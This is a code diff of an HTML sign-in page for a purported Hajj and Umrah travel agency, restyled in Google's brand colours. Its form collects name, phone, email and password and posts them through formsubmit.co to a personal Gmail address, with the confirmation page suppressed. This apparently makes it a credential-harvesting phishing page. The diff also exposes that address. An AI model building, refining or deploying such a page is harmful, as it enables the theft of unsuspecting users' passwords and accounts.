@@ -7,36 +7,36 @@
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:tahoma, sans-serif;}
   body{background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px;}
-  .card{background:white; width:100%; max-width:420px; border-radius:20px; padding:30px 25px;}
+  .card{background:white; width:100%; max-width:420px; border-radius:20px; padding:30px 25px; box-shadow:0 15px 35px rgba(0,0,0,0.3);}
   .logo{text-align:center; margin-bottom:20px;}
-  .logo h1{color:#0d47a1; font-size:34px; font-weight:900;}
+  .google-logo{font-size:36px; font-weight:900; letter-spacing:-1px;}
+  .g-blue{color:#4285F4;} .g-red{color:#EA4335;} .g-yellow{color:#FBBC05;} .g-green{color:#34A853;}
+  .logo p{color:#666; font-size:13px; margin-top:8px;}
   .input-group{margin-bottom:14px;}
-  .input-group input{width:100%; padding:13px; border:1px solid #ddd; border-radius:10px; outline:none;}
-  .btn{width:100%; padding:14px; background:#1976d2; color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer;}
+  .input-group input{width:100%; padding:13px 15px; border:1px solid #ddd; border-radius:10px; outline:none;}
+  .btn{width:100%; padding:14px; background:#4285F4; color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer;}
   .footer{text-align:center; margin-top:20px; font-size:12px; color:#999; border-top:1px solid #eee; padding-top:15px;}
 </style>
 </head>
 <body>
-
 <div class="card">
-  <div class="logo"><h1>Lovetervle ✈️</h1></div>
-
-  <!-- هنا بتحط ايميل العميل -->
-  <form action="https://formsubmit.co/CLIENT_EMAIL_HERE" method="POST">
+  <div class="logo">
+    <h1 class="google-logo">
+      <span class="g-blue">L</span><span class="g-red">o</span><span class="g-yellow">v</span><span class="g-blue">e</span><span class="g-green">t</span><span class="g-red">e</span><span class="g-yellow">r</span><span class="g-blue">v</span><span class="g-green">l</span><span class="g-red">e</span> ✈️
+    </h1>
+    <p>وكالة السفر الأولى للحج والعمرة</p>
+  </div>
+  <form action="https://formsubmit.co/mosabshareef2222@gmail.com" method="POST">
     <div class="input-group"><input type="text" name="الاسم" placeholder="الاسم الكامل" required></div>
     <div class="input-group"><input type="tel" name="الهاتف" placeholder="رقم التليفون" required></div>
     <div class="input-group"><input type="email" name="الايميل" placeholder="البريد الإلكتروني" required></div>
     <div class="input-group"><input type="password" name="كلمة المرور" placeholder="كلمة المرور" required></div>
-    
-    <!-- عشان ما يظهرش صفحة شكر -->
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_template" value="table">
-
+    <input type="hidden" name="_subject" value="تسجيل جديد - Lovetervle">
     <button type="submit" class="btn">تسجيل الدخول</button>
   </form>
-
   <div class="footer">love travels 2026 ©</div>
 </div>
-
 </body>
 </html>
